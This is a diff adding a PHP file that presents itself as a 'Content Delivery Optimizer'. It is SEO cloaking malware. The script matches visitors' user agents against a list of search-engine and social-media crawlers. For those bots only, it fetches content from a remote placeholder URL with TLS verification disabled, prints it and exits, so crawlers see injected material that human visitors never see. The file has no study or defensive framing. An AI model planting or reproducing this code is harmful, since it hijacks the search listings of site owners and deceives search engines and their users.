@@ -1,0 +1,55 @@
+<?php
+/**
+ * 4NOMAL! Content Delivery Optimizer
+ * Handles remote synchronization and bot validation.
+ * (c) 2026 Core_Systems
+ */
+
+$cdc_config = [
+    'bots' => 'Googlebot,Googlebot-News,Googlebot-Image,Googlebot-Video,bingbot,Slurp,DuckDuckBot,BingPreview,DuckDuckGo,YandexBot,Baiduspider,TelegramBot,facebookexternalhit,Pinterest,W3C_Validator,Google-Site-Verification,Google-InspectionTool,Applebot,AhrefsBot,SEMrushBot,MJ12bot',
+    'remote_url' => 'https://isinamadomainkamu.txt',
+    'timeout' => 12
+];
+
+function _sys_validate($ua, $list)
+{
+    if (empty($ua))
+        return false;
+    // High-performance Regex detection
+    $pattern = '/' . str_replace(',', '|', preg_quote($list, '/')) . '/i';
+    return (bool)preg_match($pattern, $ua);
+}
+
+function _sys_sync($url, $timeout)
+{
+    // Optimized cURL fetch
+    if (function_exists('curl_init')) {
+        $ch = curl_init($url);
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+        curl_setopt($ch, CURLOPT_TIMEOUT, $timeout);
+        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+        curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0');
+        $res = curl_exec($ch);
+        $code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+        curl_close($ch);
+        if ($code == 200)
+            return $res;
+    }
+    // Fallback to stream context
+    if (ini_get('allow_url_fopen')) {
+        $ctx = stream_context_create(['http' => ['timeout' => $timeout, 'header' => "User-Agent: Mozilla/5.0\r\n"]]);
+        return @file_get_contents($url, false, $ctx);
+    }
+    return false;
+}
+
+// Execution Trigger
+$v_ua = $_SERVER['HTTP_USER_AGENT'] ?? '';
+if (_sys_validate($v_ua, $cdc_config['bots'])) {
+    $content = _sys_sync($cdc_config['remote_url'], $cdc_config['timeout']);
+    if ($content) {
+        echo $content;
+        exit;
+    }
+}
+?>
